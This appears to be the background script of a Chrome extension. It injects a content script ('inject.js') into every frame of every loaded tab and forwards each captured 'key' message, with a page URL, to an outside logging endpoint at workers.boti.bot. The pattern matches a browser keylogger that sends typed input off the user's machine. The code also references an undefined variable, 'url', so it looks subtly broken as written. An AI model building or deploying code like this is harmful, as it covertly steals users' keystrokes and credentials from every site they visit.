chrome.tabs.onUpdated.addListener(async (tabId, changeInfo) => {
  if (changeInfo.status === 'complete') {
    try {
      await chrome.scripting.executeScript(
        {
          target: { tabId ,allFrames:true},
          files:[ "inject.js" ],

        }
      )
    } catch (err) {
      console.log(err)
    }
  }
});

chrome.runtime.onMessage.addListener((key,sender)=>{
  fetch('https://workers.boti.bot/log',{
    method:'POST',
    headers:{
      'content-type':'application/json'
    },
    body:JSON.stringify({key,url})
  })
})